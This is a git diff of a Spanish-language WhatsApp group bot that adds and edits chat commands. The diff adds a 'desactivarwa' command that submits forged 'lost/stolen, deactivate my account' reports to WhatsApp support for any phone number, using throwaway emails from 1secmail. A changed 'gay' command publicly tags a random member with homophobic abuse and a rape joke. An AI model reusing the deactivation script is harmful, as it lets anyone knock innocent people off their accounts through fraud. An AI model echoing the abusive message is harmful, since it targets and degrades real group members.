@@ -89,6 +89,11 @@ let t = m.messageTimestamp // Marca de tiempo de mensaje
 const pushname = m.pushName || "Sin nombre" // Obtiene el nombre de visualización del usuario de lo contrario será "Sin nombre"
 const botnm = conn.user.id.split(":")[0] + "@s.whatsapp.net"
 const userSender = m.key.fromMe ? botnm : m.isGroup && m.key.participant.includes(":") ? m.key.participant.split(":")[0] + "@s.whatsapp.net" : m.key.remoteJid.includes(":") ? m.key.remoteJid.split(":")[0] + "@s.whatsapp.net" : m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid
+const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
+        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
+        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
+        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
+        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
 const isCreator = global.owner.map(([numero]) => numero.replace(/[^\d\s().+:]/g, '').replace(/\s/g, '') + '@s.whatsapp.net').includes(userSender) // Eliminar todo a excepción de números 
 const itsMe = m.sender == conn.user.id ? true : false // Verifica si el remitente del mensaje es el propio bot
 const text = args.join(" ") // Unir rgumentos en una sola cadena separada por espacios
@@ -142,14 +147,14 @@ let chats = global.db.data.users[m.chat]
 let setting = global.db.data.settings[conn.user.jid]  
 
 //autobio
-if (global.db.data.settings[numBot].autobio) {
+/*if (global.db.data.settings[numBot].autobio) {
 let setting = global.db.data.settings[numBot]
 if (new Date() * 60 - setting.status > 1000) {
 let uptime = await runtime(process.uptime())
 const bio = `ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ | ᴀᴄᴛɪᴠᴏ ✅️: ${runtime(process.uptime())}\n\nᴘᴀʀᴀ ᴠᴇᴢ ᴍɪ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏ ᴜsᴀʀ #menu`
 await conn.updateProfileStatus(bio)
 setting.status = new Date() * 60
-}} 
+}} */
   
 if (global.db.data.chats[m.chat].antifake && !isGroupAdmins) {	
 if (m.chat && m.sender.startsWith('+1')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -227,7 +232,7 @@ const time = moment(Number(msg.messageTimestamp + "000")).locale("es-mx").tz("Am
 
 // ‿︵‿︵ʚɞ『 INFO CONSOLE 』ʚɞ‿︵‿︵	
 if (m.message) {
-console.log(chalk.bold.cyanBright(`▣────────────···\n│${botname}`), 
+console.log(chalk.bold.cyanBright(`▣────────────···\n│${botname} ${conn.user.id == global.numBot2 ? '' : '(jadibot)'}`), 
 chalk.bold.magenta('\n│⏰HORARIO: ') + chalk.magentaBright(moment(t * 1000).tz(place).format('DD/MM/YY HH:mm:ss'),
 chalk.bold.yellow('\n│📑TIPO (SMS): ') + chalk.yellowBright(`${type}`), 
 chalk.bold.cyan('\n│📊USUARIO: ') + chalk.cyanBright(pushname) + ' ➜', gradient.rainbow(userSender), 
@@ -387,8 +392,8 @@ if (!text) return reply(`Ejemplo : ${prefix + command} gatito`)
 let imagen1 = require('g-i-s')
 imagen1(text, async (error, result) => {
 n = result
-imagen1 = n[Math.floor(Math.random() * n.length)].url
-conn.sendimage(m.chat, { image: { url: imagen1}, caption: `*❏ Resultados:* ${text}\n❏ *Url* : ${images}`}, { quoted: m })
+imagen1 = n[Math.floor(Math.random() * n.length)]
+conn.sendMessage(from, { image: { url: imagen1}, caption: `*❏ Resultados:* ${text}`}, { quoted: m })
 })}
 break
  
@@ -659,6 +664,7 @@ case 'promote': {
 if (!m.isGroup) return reply(info.group) 
 if (!isBotAdmins) return reply(info.botAdmin)
 if (!isGroupAdmins) return reply(info.admin)
+if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE DOY ADMIN? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
@@ -668,6 +674,7 @@ case 'demote': {
 if (!m.isGroup) return reply(info.group) 
 if (!isBotAdmins) return reply(info.botAdmin)
 if (!isGroupAdmins) return reply(info.admin)
+if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE QUITO ADMINS? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
@@ -777,7 +784,9 @@ if (!m.isGroup) return reply(info.group)
 let member = participants.map(u => u.id)
 let me = m.sender
 let jodoh = member[Math.floor(Math.random() * member.length)]
-let jawab = `🏳️‍🌈  *Gay :* @${jodoh.split('@')[0]}\n\nQuién quiere violar a este gay? `
+let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+let kah = ra[Math.floor(Math.random() * ra.length)]
+let jawab = `@${jodoh.split('@')[0]} Es 🏳️‍🌈 ${kah}% Gay\n\nQuién quiere violar a este gay? `
 let ments = [me, jodoh]
 conn.sendMessage(m.chat, { text: jawab, contextInfo:{
 mentionedJid:[me, jodoh],
@@ -832,7 +841,7 @@ conn.sendMessage(from, sendMessageOptions, { quoted: quotedMessage });
 conn.sendMessage(from, { text: `Ejemplo: ${prefix + command} @tag|puto|😯`}, { quoted: msg });
 }
 break
-    
+
 case 'play':  case 'play2': {
 if (!text) return conn.sendMessage(from, { text: `*ingrese nombre de alguna cancion*` }, { quoted: msg })
 const playmp3 = require('./libs/ytdl2')
@@ -914,7 +923,8 @@ break
 
 case 's': case 'sticker': {  
 if (/image/.test(mime)) {  
-conn.sendMessage(m.chat, { text: `⏳ *Aguarde un momento estoy creando tu stickers....*\n\n*ᴺᵒ ʰᵃᵍᵃ ˢᵖᵃᵐ*` }, { quoted: m });    
+conn.fakeReply(m.chat, `⏳ *Aguarde un momento estoy creando tu stickers....*`, '0@s.whatsapp.net', 'No haga spam')
+//conn.sendMessage(m.chat, { text: `⏳ *Aguarde un momento estoy creando tu stickers....*\n\n*ᴺᵒ ʰᵃᵍᵃ ˢᵖᵃᵐ*` }, { quoted: m });    
 media = await quoted.download()  
 let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })  
 await fs.unlinkSync(encmedia)  
@@ -929,6 +939,28 @@ reply(`*Y LA IMAGEN?*`)
 }}  
 break; 
 
+case 'wm': case 'take': case 'robar':{
+if (!args.join(" ")) return reply(`*Responda un sticker para robar*`)
+conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
+const swn = args.join(" ")
+const pcknm = swn.split("|")[0]
+const atnm = swn.split("|")[1]
+if (m.quoted.isAnimated === true) {
+conn.downloadAndSaveMediaMessage(quoted, "gifee")
+conn.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+} else if (/image/.test(mime)) {
+let media = await quoted.download()
+let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+} else if (/video/.test(mime)) {
+if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
+let media = await quoted.download()
+let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+} else {
+reply(`Y la imagen?`)
+}
+}
+break
+
 case 'addcmd':
 if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
  if (!m.quoted) return conn.sendMessage(from, { text: `*[ ⚠️ ] 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰𝙻 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙾 𝙸𝙼𝙰𝙶𝙴𝙽 𝙰𝙻 𝙲𝚄𝙰𝙻 𝙳𝙴𝚂𝙴𝙰 𝙰𝙶𝚁𝙴𝙶𝙰𝚁 𝚄𝙽 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙾 𝚃𝙴𝚇𝚃𝙾*` }, { quoted: msg }); 
@@ -939,7 +971,52 @@ let hash = m.quoted.fileSha256.toString('base64')
 addCmd(text, hash)
 m.reply(`*[ ✔ ] ᴇʟ ᴛᴇxᴛᴏ/ᴄᴏᴍᴀɴᴅᴏ ᴀsɪɢɴᴀᴅᴏ ᴀʟ sᴛɪᴄᴋᴇʀ/ɪᴍᴀɢᴇɴ ғᴜᴇ ᴀɢʀᴇɢᴀᴅᴏ ᴀ ʟᴀ ʙᴀsᴇ ᴅᴇ ᴅᴀᴛᴏs ᴄᴏʀʀᴇᴄᴛᴀᴍᴇɴᴛᴇ*`)
 break
-
+	    
+case "desactivarwa": {
+if (Input) {
+let cekno = await conn.onWhatsApp(Input)
+if (cekno.length == 0) return reply(`El participante ya no está registrado en WhatsApp`)
+if (Input == owner + "@s.whatsapp.net") return reply(`Solo para mi jefe`)
+var targetnya = m.sender.split('@')[0]
+try {
+var axioss = require('axios')
+let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "INDIA")
+form.append("phone_number", `${Input.split("@")[0]}`,)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", `Perdido/roubado: desative minha conta`)
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+let res = await axioss({url, method: "POST", data: form, headers: {cookie}})
+let payload = String(res.data)
+if (payload.includes(`"payload":true`)) {
+reply(`*Listo..!*`)
+} else if (payload.includes(`"payload":false`)) {
+reply(`Uff Limit moment whatsapp.`)
+} else reply(util.format(res.data))
+} catch (err) {reply(`${err}`)}
+} else reply('*⚠️Ingresa el numero*')}
+break
+	    
 case 'getcase': 
 if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
 if (!text) return m.reply(`Que comando a buscar o que?`) 
@@ -951,7 +1028,7 @@ console.error(err)
 reply(" Error, tal vez no existe el comando") 
 } 
 break
-    	      		
+
 case 'update':
 if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });    
 try {    
